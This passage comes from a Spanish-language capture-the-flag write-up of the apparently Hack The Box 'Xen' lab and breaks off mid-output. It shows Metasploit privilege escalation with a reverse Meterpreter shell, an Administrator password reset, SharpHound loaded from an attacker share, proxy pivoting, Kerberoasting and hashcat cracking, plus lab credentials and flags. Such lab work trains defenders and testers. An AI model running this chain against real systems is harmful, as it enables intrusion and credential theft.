+</span><span class="ve">[+] </span><span class="p">10.13.38.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+</span><span class="ve">[+] </span><span class="p">10.13.38.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+</span><span class="ve">[+] </span><span class="p">10.13.38.15 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
+</span><span class="ve">[+] </span><span class="p">10.13.38.15 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
+</span><span class="az">[*] </span><span class="p">Running check method for exploit 43 / 43
+</span><span class="az">[*] </span><span class="p">Post module execution completed
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:1) post(</span><span class="ro">multi/recon/local_exploit_suggester</span><span class="p">) >></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos devuelve que es vulnerable a <code class="language-plaintext highlighter-rouge">always_install_elevated</code>, basta con ejecutar el <code class="language-plaintext highlighter-rouge">exploit</code> seteando la <code class="language-plaintext highlighter-rouge">sesión</code> y <code class="language-plaintext highlighter-rouge">host</code> para obtener una shell como <code class="language-plaintext highlighter-rouge">Administrator</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:1) post(</span><span class="ro">multi/recon/local_exploit_suggester</span><span class="p">) >> use exploit/windows/local/always_install_elevated  
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:1) exploit(</span><span class="ro">windows/local/always_install_elevated</span><span class="p">) >> set session 1
+session => 1
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:1) exploit(</span><span class="ro">windows/local/always_install_elevated</span><span class="p">) >> set lhost tun0
+lhost => tun0
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:1) exploit(</span><span class="ro">windows/local/always_install_elevated</span><span class="p">) >> run
+</span><span class="az">[*] </span><span class="p">Started reverse TCP handler on 10.10.14.10:4444
+</span><span class="az">[*] </span><span class="p">Uploading the MSI to C:\Users\pmorgan\AppData\Local\Temp\fbwGXm.msi ...
+</span><span class="az">[*] </span><span class="p">Executing MSI...
+</span><span class="az">[*] </span><span class="p">Sending stage (175686 bytes) to 10.13.38.15
+</span><span class="ve">[+] </span><span class="p">Deleted C:\Users\pmorgan\AppData\Local\Temp\fbwGXm.msi
+</span><span class="az">[*] </span><span class="p">Meterpreter session 2 opened (10.10.14.10:4444 -> 10.13.38.15:54617)
+
+(</span><span class="ve">Meterpreter </span><span class="az">2</span><span class="p">)(C:\Windows\system32) > getuid
+Server username: NT AUTHORITY\SYSTEM
+(</span><span class="ve">Meterpreter </span><span class="az">2</span><span class="p">)(C:\Windows\system32) ></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">shell</code> podemos obtener una <code class="language-plaintext highlighter-rouge">cmd</code> interactiva donde al entrar al <code class="language-plaintext highlighter-rouge">escritorio</code> del usuario <code class="language-plaintext highlighter-rouge">Administrator</code> podemos ver la <code class="language-plaintext highlighter-rouge">flag</code> asi que simplemente la leemos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">(</span><span class="ve">Meterpreter </span><span class="az">2</span><span class="p">)(C:\Windows\system32) > shell
+Process 2000 created.
+Channel 2 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation. All rights reserved.  
+
+C:\Windows\system32></span><span class="am">cd </span><span class="p">C:\Users\Administrator\Desktop
+
+C:\Users\Administrator\Desktop></span><span class="am">dir</span><span class="p">
+
+ Volume in drive C has no label.
+ Volume Serial Number is D851-8BE0
+
+ Directory of C:\Users\Administrator\Desktop
+
+03/31/2019  02:46 AM    &ltDIR>          .
+03/31/2019  02:46 AM    &ltDIR>          ..
+03/31/2019  10:51 PM                23 flag.txt
+               1 File(s)             23 bytes
+               2 Dir(s)   4,173,213,696 bytes free
+
+C:\Users\Administrator\Desktop></span><span class="am">type </span><span class="p">flag.txt
+XEN{7ru573d_1n574ll3r5}
+
+C:\Users\Administrator\Desktop></span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="flag3">
+<br><h3 class="post-title">Ghost</h3>
+<h4 class="post-title">XEN{l364cy_5pn5_ftw}</h4><br>
+
+<p class="plain-text">Para obtener una <code class="language-plaintext highlighter-rouge">powershell</code> como Administrador desde el entorno grafico de <code class="language-plaintext highlighter-rouge">Citrix</code> podemos iniciar cambiando la <code class="language-plaintext highlighter-rouge">contraseña</code> del usuario local <code class="language-plaintext highlighter-rouge">Administrator</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">C:\Windows\system32></span><span class="am">net </span><span class="p">user Administrator password123#  
+The command completed successfully.
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora con <code class="language-plaintext highlighter-rouge">runas</code> ejecutamos una powershell <code class="language-plaintext highlighter-rouge">bypasseando</code> la politica de ejecución como el usuario <code class="language-plaintext highlighter-rouge">Administrator</code> proporcionando la <code class="language-plaintext highlighter-rouge">contraseña</code> que hemos definido</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">C:\Users\pmorgan\Desktop></span><span class="am">runas </span><span class="p">/user:Administrator </span><span class="az">"powershell -ep bypass"</span><span class="p">
+Enter the password for Administrator: password123#
+Attempting to start powershell -ep bypass as user "VDESKTOP3\Administrator" ...  
+
+C:\Users\pmorgan\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al hacerlo se nos dará una nueva <code class="language-plaintext highlighter-rouge">consola</code> esta vez de <code class="language-plaintext highlighter-rouge">powershell</code> pero como el usuario <code class="language-plaintext highlighter-rouge">Administrator</code> el cual localmente tiene máximos <code class="language-plaintext highlighter-rouge">privilegios</code> en el sistema</p>
+<a href="/endgames/xen/17.png" target="_blank"><div><p><img src="/endgames/xen/17.png"></p></div></a>
+
+<p class="plain-text">Haciendo uso del modulo <a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1">SharpHound.ps1</a> enumeraremos toda la información del <code class="language-plaintext highlighter-rouge">dominio</code>, esto nos creara un <code class="language-plaintext highlighter-rouge">zip</code> con todos los <code class="language-plaintext highlighter-rouge">json</code> que tienen la información</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">Import-Module </span><span class="p">\\10.10.14.14\kali\SharpHound.ps1
+PS C:\ProgramData> </span><span class="am">Invoke-BloodHound </span><span class="c1">-CollectionMethod </span><span class="p">All
+PS C:\ProgramData> </span><span class="am">dir</span><span class="p">
+
+   Directory: C:\ProgramData
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+d----         2/11/2019   5:30 PM            Citrix
+d---s         2/24/2019   6:17 PM            Microsoft
+d----         2/10/2019   7:03 PM            Package Cache
+d----         2/10/2019   7:04 PM            VMware
+-a---         4/25/2023   1:42 PM      15979 20230425184206_BloodHound.zip  
+-a---         4/25/2023   1:29 PM    1318097 SharpHound.ps1
+
+PS C:\ProgramData></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Desde la sesión de <code class="language-plaintext highlighter-rouge">meterpreter</code> podemos usar la función <code class="language-plaintext highlighter-rouge">download</code> para descargar el <code class="language-plaintext highlighter-rouge">comprimido</code> zip que <code class="language-plaintext highlighter-rouge">SharpHound</code> ha creado a nuestro equipo local y analizarlo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">(</span><span class="ve">Meterpreter </span><span class="az">2</span><span class="p">)(C:\ProgramData) > download 20230425184206_BloodHound.zip
+</span><span class="az">[*] </span><span class="p">Downloading: 20230425184206_BloodHound.zip -> /home/kali/20230425184206_BloodHound.zip
+</span><span class="az">[*] </span><span class="p">Completed  : 20230425184206_BloodHound.zip -> /home/kali/20230425184206_BloodHound.zip  
+(</span><span class="ve">Meterpreter </span><span class="az">2</span><span class="p">)(C:\ProgramData) ></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Antes iniciemos por hacernos una idea de la <code class="language-plaintext highlighter-rouge">red</code>, al hacer un simple <code class="language-plaintext highlighter-rouge">ping</code> a el computername <code class="language-plaintext highlighter-rouge">DC</code> podemos ver su dirección <code class="language-plaintext highlighter-rouge">Ipv4</code> bajo la <code class="language-plaintext highlighter-rouge">172.16.249.*</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">(</span><span class="ve">Meterpreter </span><span class="az">2</span><span class="p">)(C:\Windows\system32) > shell
+Process 364 created.
+Channel 4 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32></span><span class="am">ping </span><span class="p">-n 1 dc
+
+Pinging DC.htb.local [172.16.249.200] with 32 bytes of data:  
+Reply from 172.16.249.200: bytes=32 time<1ms TTL=128
+
+Ping statistics for 172.16.249.200:
+    Packets: Sent = 1, Received = 1, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 0ms, Maximum = 0ms, Average = 0ms
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos hacer lo mismo con los demas <code class="language-plaintext highlighter-rouge">hostnames</code> para ver su Ipv4 como <code class="language-plaintext highlighter-rouge">citrix</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">C:\Windows\system32></span><span class="am">ping</span><span class="p"> -n 1 citrix
+
+Pinging citrix.htb.local [172.16.249.201] with 32 bytes of data:  
+Reply from 172.16.249.201: bytes=32 time<1ms TTL=128
+
+Ping statistics for 172.16.249.201:
+    Packets: Sent = 1, Received = 1, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 0ms, Maximum = 0ms, Average = 0ms
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Después de haber enumerado todos los <code class="language-plaintext highlighter-rouge">hosts</code> nos queda uno, <code class="language-plaintext highlighter-rouge">NetScaler</code> el cual por logica podemos saber que es el <code class="language-plaintext highlighter-rouge">.202</code> y devuelve <code class="language-plaintext highlighter-rouge">64</code> de ttl, puede ser <code class="language-plaintext highlighter-rouge">Linux</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">C:\Windows\system32></span><span class="am">ping</span><span class="p"> -n 1 172.16.249.202
+
+Pinging 172.16.249.202 with 32 bytes of data:
+Reply from 172.16.249.202: bytes=32 time=101ms TTL=64
+
+Ping statistics for 172.16.249.202:
+    Packets: Sent = 1, Received = 1, Lost = 0 (0% loss),  
+Approximate round trip times in milli-seconds:
+    Minimum = 101ms, Maximum = 101ms, Average = 101ms
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Teniendo un cuenta los <code class="language-plaintext highlighter-rouge">hostnames</code> y direcciones nos quedaria un <code class="language-plaintext highlighter-rouge">mapa</code> como este</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">[</span><span class="ve">+</span><span class="p">] Hosts activos en 172.16.249.200/24:  
+
+    [</span><span class="az">*</span><span class="p">] 172.16.249.200: dc
+    [</span><span class="az">*</span><span class="p">] 172.16.249.201: citrix
+    [</span><span class="az">*</span><span class="p">] 172.16.249.202: netscaler
+    [</span><span class="az">*</span><span class="p">] 172.16.249.203: vdesktop1
+    [</span><span class="az">*</span><span class="p">] 172.16.249.204: vdesktop2
+    [</span><span class="az">*</span><span class="p">] 172.16.249.205: vdesktop3</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para tener acceso desde nuestro equipo usaremos como <code class="language-plaintext highlighter-rouge">proxy</code> la máquina que comprometimos, desde metasploit usamos <code class="language-plaintext highlighter-rouge">autoroute</code> indicando la sesión</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">(</span><span class="ve">Meterpreter </span><span class="az">2</span><span class="p">)(C:\Windows\system32) > background
+</span><span class="az">[*] </span><span class="p">Backgrounding session 2...
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:2) exploit(</span><span class="ro">windows/local/always_install_elevated</span><span class="p">) >> use post/multi/manage/autoroute  
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:2) post(</span><span class="ro">multi/manage/autoroute</span><span class="p">) >> set session 1
+session => 1
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:2) post(</span><span class="ro">multi/manage/autoroute</span><span class="p">) >> run
+
+</span><span class="am">[!] </span><span class="p">SESSION may not be compatible with this module:
+</span><span class="am">[!] </span><span class="p"> * incompatible session platform: windows
+</span><span class="az">[*] </span><span class="p">Running module against VDESKTOP3
+</span><span class="az">[*] </span><span class="p">Searching for subnets to autoroute.
+</span><span class="ve">[+] </span><span class="p">Route added to subnet 10.13.38.0/255.255.255.0 from host's routing table.
+</span><span class="ve">[+] </span><span class="p">Route added to subnet 172.16.249.0/255.255.255.0 from host's routing table.
+</span><span class="az">[*] </span><span class="p">Post module execution completed
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:2) post(</span><span class="ro">multi/manage/autoroute</span><span class="p">) >></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora crearemos una conexión <code class="language-plaintext highlighter-rouge">socks</code>, podemos usar los parametros por <code class="language-plaintext highlighter-rouge">defecto</code> que crea el <code class="language-plaintext highlighter-rouge">proxy</code> a través de la interfaz <code class="language-plaintext highlighter-rouge">0.0.0.0</code> usando el puerto <code class="language-plaintext highlighter-rouge">1080</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:2) post(</span><span class="ro">multi/manage/autoroute</span><span class="p">) >> use auxiliary/server/socks_proxy  
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:2) auxiliary(</span><span class="ro">server/socks_proxy</span><span class="p">) >> run
+</span><span class="az">[*] </span><span class="p">Auxiliary module running as background job 0.
+
+</span><span class="az">[*] </span><span class="p">Starting the SOCKS proxy server
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:1 </span><span class="az">Agents</span><span class="p">:2) auxiliary(</span><span class="ro">server/socks_proxy</span><span class="p">) >></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">proxychains</code> pasando por el puerto <code class="language-plaintext highlighter-rouge">1080</code> del proxy tenemos conexión con la <code class="language-plaintext highlighter-rouge">interfaz</code> interna, iniciamos por ver con <code class="language-plaintext highlighter-rouge">crackmapexec</code> las máquinas con <code class="language-plaintext highlighter-rouge">smb</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec smb 172.16.249.200-205
+</span><span class="az">SMB         </span><span class="p">172.16.249.201  445    CITRIX           </span><span class="az">[*] </span><span class="p">Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:CITRIX) (domain:htb.local) (signing:False) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">172.16.249.205  445    VDESKTOP3        </span><span class="az">[*] </span><span class="p">Windows 7 Professional 7601 Service Pack 1 x64 (name:VDESKTOP3) (domain:htb.local) (signing:False) (SMBv1:True)
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:htb.local) (signing:True) (SMBv1:False)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Pasemos a la data recolectada antes con <code class="language-plaintext highlighter-rouge">bloodhound</code>, listando todos los <code class="language-plaintext highlighter-rouge">usuarios</code> <code class="language-plaintext highlighter-rouge">kerberoasteables</code> del dominio encontramos vulnerable al usuario <code class="language-plaintext highlighter-rouge">mturner</code></p>
+<a href="/endgames/xen/18.png" target="_blank"><div><p><img src="/endgames/xen/18.png"></p></div></a>
+
+<p class="plain-text">Es cierto que necesitamos <code class="language-plaintext highlighter-rouge">credenciales</code> para hacer el <code class="language-plaintext highlighter-rouge">kerberoasting</code> sin embargo al probar las que encontramos al inicio, las de <code class="language-plaintext highlighter-rouge">pmorgan</code> son válidas en el <code class="language-plaintext highlighter-rouge">dominio</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec smb 172.16.249.200 -u pmorgan -p Summer1Summer!
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:htb.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="ve">[+] </span><span class="p">htb.local\pmorgan:Summer1Summer!</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos usarlas para con <code class="language-plaintext highlighter-rouge">GetUserSPNs</code> de <code class="language-plaintext highlighter-rouge">impacket</code> hacer una petición del <code class="language-plaintext highlighter-rouge">TGS</code> de los usuarios kerberoasteables, al hacerlo recibimos un <code class="language-plaintext highlighter-rouge">hash</code> del usuario <code class="language-plaintext highlighter-rouge">mturner</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q impacket-GetUserSPNs htb.local/pmorgan:Summer1Summer! -dc-ip 172.16.249.200 -request 
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+ServicePrincipalName                Name     MemberOf                                 PasswordLastSet             LastLogon                   Delegation 
+----------------------------------  -------  ---------------------------------------  --------------------------  --------------------------  ----------
+MSSQLSvc/CITRIXTEST.HTB.LOCAL:1433  mturner  CN=Deployment,OU=Groups,DC=htb,DC=local  2019-02-13 17:23:48.796612  2023-04-17 05:16:45.659598             
+
+[-] CCache file is not found. Skipping...
+
+$krb5tgs$23$*mturner$HTB.LOCAL$htb.local/mturner*$527ee48ade01c5b1769e29d9539fbbfd$5de926ab2685f84b161ffd206dd22088511459cd08e65a6dadd8956e2fbd9df4721157e61ea1331bb51e2baa31ec83e1b7ac11b6f8e24fd9c11f03615e013d15e9d0ed2b3bf6ffc3ef8b90e37b1834e8c4e6c9cfd6a7e40b2066c76ceaecfff89489846485dc83eb5904127c32c2a662e93ef6d1b877e30ec32247d5b28d3389c67dfe3c3f3afababf669c5532ee6b47e6f18ee20a43ed1d8a4ea103b115e42f743beb1199ea1e40d816c5e14e036d4b3f36bd95820f756da527e0a725b612a4055ff9500449bdf92e235ae17522cc50c4c2d776d23c4859be7cae5d5fb6c0593989fbfb244cf505b9f4366a081847f278bee5fb543277911e2237f003974a314543dd1bc0cd2ce00345c733f9b5bb082fad58967838bb79cf64b2eded80ee41deeb5c44c939577c068fded59bd93a683e54cb35fbe03facd7ad59057bf4612143b38c505d5cd84994c9e6e026fccb12ca332ee8dac924717b6f7947c962f5f95c8acc0ade9d492efaf6afe57aa4234bcb0a5949089cde7f7043d2b69c1f924729411a9932cf5d1328964d6562d9ae1948fc3003d2d576e0f9791eb2c816bcc7c8959278113c4b9bc4a2c8711335abb8cc366dcba966e2bac0730e402f9d9a45bc87699ba6486a96c4e1d591b6a3e9a255bac4685e4389d8349c6b176b5adb7d9569a2619d89f0c7bdcd1ed7dcbf7ef64f1c307f6a561a374e48b0e254a425ab0913e51978ddee508b135e4d24a70950a7572ebd05ee7455b0fc10ae3d25312025cfc0e39654ed4e9ee7aa192f68bea94dea8a0aec408e5717dec8704b124892ffa87e58d0c15a481a1c6ff2876269c92e835a42416e09bac977819e20cc027072a62d3f28d98b06e30b5684fe56cca36bc0e46dc094871e3481d7775c88e7a576a6998f07a613b94e00b04faaff03c8c99d7c966169edb86c3bfc7d44ce9a34623fbdc398d623f90a6991730c55cc852004a22d5540c30af2275002aec8b4bc91f947dc2de0baf9317e39bbac851a02e5d23a63f0ef7a08cfd20030ee98e82d0a48971c14e80ae6d3fb32a13a9639e312ebe28d8caa3f2530763166c1fba174f57033e66c834878d34774e4af33f501807a4888051d91704a46ec4952a9984b5ab7735b83f37c88edde9c80802d69544efb6dac190dfec804c01904b613777cb21e466107e5736132ffa814c397bf8104d935038642b5a8f9d761d0b8077460799b750a7e4c9022fd95370f72a9143e4bf6c9f6d88f4e86a0aaf4b9a3e20683c010ccce325a2c4a0f3a276878ba2b65d9159b03f85796fd4e6e0bc8fe84e9ad88  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al tirar hashcat de primeras no logramos romper el <code class="language-plaintext highlighter-rouge">hash</code> usando el <code class="language-plaintext highlighter-rouge">rockyou.txt</code>, pero al utilizar algunas <code class="language-plaintext highlighter-rouge">reglas</code> logramos obtener la contraseña <code class="language-plaintext highlighter-rouge">4install!</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ hashcat </span><span class="p">-a 0 -m 13100 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -r /usr/share/hashcat/rules/dive.rule --force
+hashcat (v6.1.1) starting...
+
+=============================================================================================================================
+* Device #1: pthread-DO-Regular, 5841/5905 MB (2048 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 99086
+
+Applicable optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+Host memory required for this attack: 134 MB
+
+Dictionary cache built:
+* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+* Passwords.: 14344391
+* Bytes.....: 139921497
+* Keyspace..: 1421327633024
+* Runtime...: 1 sec
+
+$krb5tgs$23$*mturner$HTB.LOCAL$htb.local/mturner*$527ee48ade01c5b1769e29d9539fbbfd$5de926ab2685f84b161ffd206dd22088511459cd08e65a6dadd8956e2fbd9df4721157e61ea1331bb51e2baa31ec83e1b7ac11b6f8e24fd9c11f03615e013d15e9d0ed2b3bf6ffc3ef8b90e37b1834e8c4e6c9cfd6a7e40b2066c76ceaecfff89489846485dc83eb5904127c32c2a662e93ef6d1b877e30ec32247d5b28d3389c67dfe3c3f3afababf669c5532ee6b47e6f18ee20a43ed1d8a4ea103b115e42f743beb1199ea1e40d816c5e14e036d4b3f36bd95820f756da527e0a725b612a4055ff9500449bdf92e235ae17522cc50c4c2d776d23c4859be7cae5d5fb6c0593989fbfb244cf505b9f4366a081847f278bee5fb543277911e2237f003974a314543dd1bc0cd2ce00345c733f9b5bb082fad58967838bb79cf64b2eded80ee41deeb5c44c939577c068fded59bd93a683e54cb35fbe03facd7ad59057bf4612143b38c505d5cd84994c9e6e026fccb12ca332ee8dac924717b6f7947c962f5f95c8acc0ade9d492efaf6afe57aa4234bcb0a5949089cde7f7043d2b69c1f924729411a9932cf5d1328964d6562d9ae1948fc3003d2d576e0f9791eb2c816bcc7c8959278113c4b9bc4a2c8711335abb8cc366dcba966e2bac0730e402f9d9a45bc87699ba6486a96c4e1d591b6a3e9a255bac4685e4389d8349c6b176b5adb7d9569a2619d89f0c7bdcd1ed7dcbf7ef64f1c307f6a561a374e48b0e254a425ab0913e51978ddee508b135e4d24a70950a7572ebd05ee7455b0fc10ae3d25312025cfc0e39654ed4e9ee7aa192f68bea94dea8a0aec408e5717dec8704b124892ffa87e58d0c15a481a1c6ff2876269c92e835a42416e09bac977819e20cc027072a62d3f28d98b06e30b5684fe56cca36bc0e46dc094871e3481d7775c88e7a576a6998f07a613b94e00b04faaff03c8c99d7c966169edb86c3bfc7d44ce9a34623fbdc398d623f90a6991730c55cc852004a22d5540c30af2275002aec8b4bc91f947dc2de0baf9317e39bbac851a02e5d23a63f0ef7a08cfd20030ee98e82d0a48971c14e80ae6d3fb32a13a9639e312ebe28d8caa3f2530763166c1fba174f57033e66c834878d34774e4af33f501807a4888051d91704a46ec4952a9984b5ab7735b83f37c88edde9c80802d69544efb6dac190dfec804c01904b613777cb21e466107e5736132ffa814c397bf8104d935038642b5a8f9d761d0b8077460799b750a7e4c9022fd95370f72a9143e4bf6c9f6d88f4e86a0aaf4b9a3e20683c010ccce325a2c4a0f3a276878ba2b65d9159b03f85796fd4e6e0bc8fe84e9ad88:4install!  
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: Kerberos 5 TGS-REP etype 23
+Hash.Target......: $krb5tgs$23$*mturner$HTB.LOCAL$MSSQLSvc/CITRIXTEST....9ad88
+Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
+Guess.Mod........: Rules (/usr/share/hashcat/rules/dive.rule)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   348.1 kH/s (14.54ms) @ Accel:8 Loops:4 Thr:64 Vec:8
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 8733004800/1421327732110 (0.61%)
+Rejected.........: 0/8733004800 (0.00%)
+Restore.Point....: 87552/14344385 (0.61%)
+Restore.Sub.#1...: Salt:0 Amplifier:37644-37648 Iteration:0-4
+Candidates.#1....: temperaas1ture -> hako03</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> usando las credenciales de <code class="language-plaintext highlighter-rouge">mturner</code> podemos enumerar los <code class="language-plaintext highlighter-rouge">recursos</code> en los equipos, en <code class="language-plaintext highlighter-rouge">Citrix</code> tenemos permiso de lectura sobre <code class="language-plaintext highlighter-rouge">Citrix$</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q crackmapexec smb 172.16.249.200-205 -u mturner -p 4install! --shares
+</span><span class="az">SMB         </span><span class="p">172.16.249.205  445    VDESKTOP3        </span><span class="az">[*] </span><span class="p">Windows 7 Professional 7601 Service Pack 1 x64 (name:VDESKTOP3) (domain:htb.local) (signing:False) (SMBv1:True)
+</span><span class="az">SMB         </span><span class="p">172.16.249.201  445    CITRIX           </span><span class="az">[*] </span><span class="p">Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:CITRIX) (domain:htb.local) (signing:False) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:htb.local) (signing:True) (SMBv1:False)
+</span><span class="az">SMB         </span><span class="p">172.16.249.205  445    VDESKTOP3        </span><span class="ve">[+] </span><span class="p">htb.local\mturner:4install! 
+</span><span class="az">SMB         </span><span class="p">172.16.249.201  445    CITRIX           </span><span class="ve">[+] </span><span class="p">htb.local\mturner:4install! 
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="ve">[+] </span><span class="p">htb.local\mturner:4install! 
+</span><span class="az">SMB         </span><span class="p">172.16.249.205  445    VDESKTOP3        </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">172.16.249.205  445    VDESKTOP3        </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">172.16.249.205  445    VDESKTOP3        </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">172.16.249.205  445    VDESKTOP3        </span><span class="am">ADMIN$                          Remote Admin
+</span><span class="az">SMB         </span><span class="p">172.16.249.205  445    VDESKTOP3        </span><span class="am">C$                              Default share
+</span><span class="az">SMB         </span><span class="p">172.16.249.205  445    VDESKTOP3        </span><span class="am">IPC$                            Remote IPC
+</span><span class="az">SMB         </span><span class="p">172.16.249.201  445    CITRIX           </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">172.16.249.201  445    CITRIX           </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">172.16.249.201  445    CITRIX           </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">172.16.249.201  445    CITRIX           </span><span class="am">ADMIN$                          Remote Admin
+</span><span class="az">SMB         </span><span class="p">172.16.249.201  445    CITRIX           </span><span class="am">C$                              Default share
+</span><span class="az">SMB         </span><span class="p">172.16.249.201  445    CITRIX           </span><span class="am">Citrix$         READ            
+</span><span class="az">SMB         </span><span class="p">172.16.249.201  445    CITRIX           </span><span class="am">IPC$                            Remote IPC
+</span><span class="az">SMB         </span><span class="p">172.16.249.201  445    CITRIX           </span><span class="am">ISOs                            
